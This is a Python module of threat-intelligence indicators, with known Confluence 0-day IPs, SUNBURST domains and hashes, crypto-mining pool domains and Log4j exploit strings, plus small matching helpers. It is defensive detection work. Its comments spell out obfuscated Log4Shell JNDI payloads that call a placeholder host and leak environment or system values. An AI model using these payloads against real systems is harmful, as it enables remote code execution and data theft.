# pylint: disable=line-too-long

# 2022-06-02 Confluence 0-Day IOCs:
# https://github.com/volexity/threat-intel/blob/main/2022/2022-06-02%20Active%20Exploitation%20Of%20Confluence%200-day/indicators/indicators.csv
VOLEXITY_CONFLUENCE_IP_IOCS = {
    "156.146.34.46",
    "156.146.34.9",
    "156.146.56.136",
    "198.147.22.148",
    "45.43.19.91",
    "66.115.182.102",
    "66.115.182.111",
    "67.149.61.16",
    "154.16.105.147",
    "64.64.228.239",
    "156.146.34.52",
    "154.146.34.145",
    "221.178.126.244",
    "59.163.248.170",
    "98.32.230.38",
}

# SUNBURST IOCs:
# https://github.com/fireeye/sunburst_countermeasures/blob/main/indicator_release/Indicator_Release_NBIs.csv
# Last accessed: 2021-11-17
SUNBURST_FQDN_IOCS = {
    "databasegalore.com",
    "deftsecurity.com",
    "freescanonline.com",
    "highdatabase.com",
    "incomeupdate.com",
    "panhardware.com",
    "thedoccloud.com",
    "websitetheme.com",
    "zupertech.com",
    "6a57jk2ba1d9keg15cbg.appsync-api.eu-west-1.avsvmcloud.com",
    "7sbvaemscs0mc925tb99.appsync-api.us-west-2.avsvmcloud.com",
    "gq1h856599gqh538acqn.appsync-api.us-west-2.avsvmcloud.com",
    "ihvpgv9psvq02ffo77et.appsync-api.us-east-2.avsvmcloud.com",
    "k5kcubuassl3alrf7gm3.appsync-api.eu-west-1.avsvmcloud.com",
    "mhdosoksaccf9sni9icp.appsync-api.eu-west-1.avsvmcloud.com",
}

SUNBURST_IP_IOCS = {"0.0.0.1"}

# https://github.com/mandiant/sunburst_countermeasures/blob/main/indicator_release/Indicator_Release_Hashes.csv
# Last accessed: 2021-11-17
SUNBURST_SHA256_IOCS = {
    "019085a76ba7126fff22770d71bd901c325fc68ac55aa743327984e89f4b0134",
    "292327e5c94afa352cc5a02ca273df543f2020d0e76368ff96c84f4e90778712",
    "32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77",
    "53f8dfc65169ccda021b72a62e0c22a4db7c4077f002fa742717d41b3c40f2c7",
    "abe22cf0d78836c3ea072daeaf4c5eeaf9c29b6feb597741651979fc8fbd2417",
    "ce77d116a074dab7a22a0fd4f2c1ab475f16eec42e1ded3c0b0aa8211fe858d6",
    "d0d626deb3f9484e649294a8dfa814c5568f846d5aa02d4cdad5d041a29d5600",
}

# LOG4J IOCs:
# IPs Pulled from the following sources, deduped and compiled here.
# https://gist.github.com/gnremy/c546c7911d5f876f263309d7161a7217
# https://raw.githubusercontent.com/Azure/Azure-Sentinel/master/Sample%20Data/Feeds/Log4j_IOC_List.csv
# https://raw.githubusercontent.com/Malwar3Ninja/Exploitation-of-Log4j2-CVE-2021-44228/main/Threatview.io-log4j2-IOC-list
# Created 12-13-21

LOG4J_IP_IOCS = {
    # The rule using this set has been deprecated and disabled by default
    "0.0.0.1"
}

# Example sources:
# - https://www.fastly.com/blog/new-data-and-insights-into-log4shell-attacks-cve-2021-44228
# - https://news.sophos.com/en-us/2021/12/12/log4shell-hell-anatomy-of-an-exploit-outbreak/
LOG4J_EXPLOIT_IOCS = {
    "jndi:ldap:/",
    "jndi:rmi:/",
    "jndi:ldaps:/",
    "jndi:dns:/",
    "jndi:nis:/",
    "jndi:nds:/",
    "jndi:corba:/",
    "jndi:iiop:/",
    "jndi:${",
    "${jndi:",  # breadth
    "${lower:",  # example: ${jn${lower:d}i:l${lower:d}ap://example.${lower:c}om:1234/callback}
    "${upper:",  # example: ${jnd${upper:i}:ldap://example.com:1234/callback/}
    "${env:",  # example: ${jndi:ldap://example.com:1234/callback/${env:USER}
    "${sys:",  # example: ${jndi:ldap://example.com:1234/callback/${sys:java.version}
    "${java:",  # example: ${jndi:ldap://example.com:1234/callback/${java:os}
    "${date:",  # example: ${jndi:ldap://example.com:1234/callback/${date:MM-dd-yyyy}
    "${::-j",  # example: ${${::-j}${::-n}di:${::-l}d${::-a}p://example.com:1234/callback}
}

# Sources:
# - https://github.com/SigmaHQ/sigma/blob/392500131d75634d8db43b2a2de9ddeb8c9f59dc/rules/network/zeek/zeek_dns_mining_pools.yml
# - https://github.com/SigmaHQ/sigma/blob/392500131d75634d8db43b2a2de9ddeb8c9f59dc/rules/network/dns/net_dns_pua_cryptocoin_mining_xmr.yml
# - https://github.com/SigmaHQ/sigma/blob/392500131d75634d8db43b2a2de9ddeb8c9f59dc/rules/windows/network_connection/net_connection_win_crypto_mining_pools.yml
CRYPTO_MINING_DOMAINS = {
    "1gh.com",
    "abcxyz.stream",
    "alimabi.cn",
    "ap.luckpool.net",
    "asiapool.io",
    "backup-pool.com",
    "baikalmine.com",
    "bcn.pool.minergate.com",
    "bcn.vip.pool.minergate.com",
    "bohemianpool.com",
    "ca.minexmr.com",
    "ca.monero.herominers.com",
    "cbd.monerpool.org",
    "cbdv2.monerpool.org",
    "coinfoundry.org",
    "coinpoolit.webhop.me",
    "coolmining.club",
    "cryptmonero.com",
    "crypto-pool.fr",
    "crypto-pool.info",
    "crypto-pools.org",
    "cryptoescrow.eu",
    "cryptoknight.cc",
    "cryptonight-hub.miningpoolhub.com",
    "cryptonight.net",
    "cryptonotepool.org.uk",
    "cryptonotepool.org",
    "d1pool.ddns.net",
    "d5pool.us",
    "daili01.monerpool.org",
    "de.minexmr.com",
    "dl.nbminer.com",
    "do-dear.com",
    "donate.graef.in",
    "donate.ssl.xmrig.com",
    "donate.v2.xmrig.com",
    "donate.xmrig.com",
    "donate2.graef.in",
    "drill.moneroworld.com",
    "dwarfpool.com",
    "emercoin.com",
    "emercoin.net",
    "emergate.net",
    "ethereumpool.co",
    "eu.luckpool.net",
    "eu.minerpool.pw",
    "extremehash.com",
    "extremepool.org",
    "extrmepool.org",
    "fairhash.org",
    "fairpool.cloud",
    "fairpool.xyz",
    "fcn-xmr.pool.minergate.com",
    "fee.xmrig.com",
    "fr.minexmr.com",
    "freeyy.me",
    "gntl.co.uk",
    "hash-to-coins.com",
    "hashanywhere.com",
    "hashfor.cash",
    "hashinvest.net",
    "hashinvest.ws",
    "hashvault.pro",
    "hellominer.com",
    "herominers.com",
    "huadong1-aeon.ppxxmr.com",
    "iwanttoearn.money",
    "jw-js1.ppxxmr.com",
    "kippo.eu",
    "koto-pool.work",
    "lhr.nbminer.com",
    "lhr3.nbminer.com",
    "linux-repository-updates.com",
    "linux.monerpool.org",
    "litecoinpool.org",
    "lokiturtle.herominers.com",
    "luckpool.net",
    "masari.miner.rocks",
    "mine.c3pool.com",
    "mine.moneropool.com",
    "mine.ppxxmr.com",
    "mine.zpool.ca",
    "mine1.ppxxmr.com",
    "minemonero.gq",
    "miner.center",
    "miner.ppxxmr.com",
    "miner.rocks",
    "minercircle.com",
    "minergate.com",
    "minerpool.pw",
    "minerrocks.com",
    "miners.pro",
    "minerxmr.ru",
    "mineshaft.ml",
    "minexmr.cn",
    "minexmr.com",
    "minexmr.org",
    "mining-help.ru",
    "mininglottery.eu",
    "miningpoolhub.com",
    "mixpools.org",
    "moner.monerpool.org",
    "moner1min.monerpool.org",
    "monero-master.crypto-pool.fr",
    "monero.crypto-pool.fr",
    "monero.farm",
    "monero.hashvault.pro",
    "monero.herominers.com",
    "monero.lindon-pool.win",
    "monero.miners.pro",
    "monero.net",
    "monero.riefly.id",
    "monero.us.to",
    "monerocean.stream",
    "monerogb.com",
    "monerohash.com",
    "monerominers.net",
    "moneroocean.stream",
    "moneropool.com",
    "moneropool.nl",
    "moneropool.ru",
    "moneropools.com",
    "monerorx.com",
    "monerpool.org",
    "mooo.com",
    "moriaxmr.com",
    "mro.pool.minergate.com",
    "multipool.us",
    "multipooler.com",
    "myxmr.pw",
    "na.luckpool.net",
    "nanopool.org",
    "nbminer.com",
    "node3.luckpool.net",
    "noobxmr.com",
    "pangolinminer.comgandalph3000.com",
    "pool-proxy.com",
    "pool.4i7i.com",
    "pool.armornetwork.org",
    "pool.cortins.tk",
    "pool.gntl.co.uk",
    "pool.hashvault.pro",
    "pool.minergate.com",
    "pool.minexmr.com",
    "pool.monero.hashvault.pro",
    "pool.ppxxmr.com",
    "pool.somec.cc",
    "pool.support",
    "pool.supportxmr.com",
    "pool.usa-138.com",
    "pool.xmr.pt",
    "pool.xmrfast.com",
    "pool2.armornetwork.org",
    "poolchange.ppxxmr.com",
    "pooldd.com",
    "poolmining.org",
    "poolto.be",
    "ppxvip1.ppxxmr.com",
    "ppxxmr.com",
    "prohash.net",
    "r.twotouchauthentication.online",
    "randomx.xmrig.com",
    "ratchetmining.com",
    "secumine.net",
    "seed.emercoin.com",
    "seed.emercoin.net",
    "seed.emergate.net",
    "seed1.joulecoin.org",
    "seed2.joulecoin.org",
    "seed3.joulecoin.org",
    "seed4.joulecoin.org",
    "seed5.joulecoin.org",
    "seed6.joulecoin.org",
    "seed7.joulecoin.org",
    "seed8.joulecoin.org",
    "semipool.com",
    "sg.minexmr.com",
    "sheepman.mine.bz",
    "shscrypto.net",
    "siamining.com",
    "sumokoin.minerrocks.com",
    "supportxmr.com",
    "suprnova.cc",
    "teracycle.net",
    "trtl.cnpool.cc",
    "trtl.pool.mine2gether.com",
    "tubepool.xyz",
    "turtle.miner.rocks",
    "unipool.pro",
    "us-west.minexmr.com",
    "usxmrpool.com",
    "viaxmr.com",
    "walpool.com",
    "webcoin.me",
    "webservicepag.webhop.net",
    "xiazai.monerpool.org",
    "xiazai1.monerpool.org",
    "xmc.pool.minergate.com",
    "xmo.pool.minergate.com",
    "xmr-asia1.nanopool.org",
    "xmr-au1.nanopool.org",
    "xmr-eu1.nanopool.org",
    "xmr-eu2.nanopool.org",
    "xmr-jp1.nanopool.org",
    "xmr-us-east1.nanopool.org",
    "xmr-us-west1.nanopool.org",
    "xmr-us.suprnova.cc",
    "xmr-usa.dwarfpool.com",
    "xmr.2miners.com",
    "xmr.5b6b7b.ru",
    "xmr.alimabi.cn",
    "xmr.bohemianpool.com",
    "xmr.crypto-pool.fr",
    "xmr.crypto-pool.info",
    "xmr.f2pool.com",
    "xmr.hashcity.org",
    "xmr.hex7e4.ru",
    "xmr.ip28.net",
    "xmr.monerpool.org",
    "xmr.mypool.online",
    "xmr.nanopool.org",
    "xmr.pool.gntl.co.uk",
    "xmr.pool.minergate.com",
    "xmr.poolto.be",
    "xmr.ppxxmr.com",
    "xmr.prohash.net",
    "xmr.pt",
    "xmr.simka.pw",
    "xmr.somec.cc",
    "xmr.suprnova.cc",
    "xmr.usa-138.com",
    "xmr.vip.pool.minergate.com",
    "xmr1min.monerpool.org",
    "xmrf.520fjh.org",
    "xmrf.fjhan.club",
    "xmrfast.com",
    "xmrget.com",
    "xmrigcc.graef.in",
    "xmrminer.cc",
    "xmrminerpro.com",
    "xmrpool.com",
    "xmrpool.de",
    "xmrpool.eu",
    "xmrpool.me",
    "xmrpool.net",
    "xmrpool.xyz",
    "xx11m.monerpool.org",
    "xx11mv2.monerpool.org",
    "xxx.hex7e4.ru",
    "zarabotaibitok.ru",
    "zer0day.ru",
}


# IOC Helper functions:
def ioc_match(indicators: list, known_iocs: set) -> list:
    """Matches a set of indicators against known Indicators of Compromise

    :param indicators: List of potential indicators of compromise
    :param known_iocs: Set of known indicators of compromise
    :return: List of any indicator matches
    """
    # Check through the IP IOCs
    return [ioc for ioc in (indicators or []) if ioc in known_iocs]


def sanitize_domain(domain: str) -> str:
    """Makes a potential malicious domain not render as a domain in most systems

    :param domain: Original domain
    :return: Sanitized domain
    """
    return domain.replace(".", "[.]")
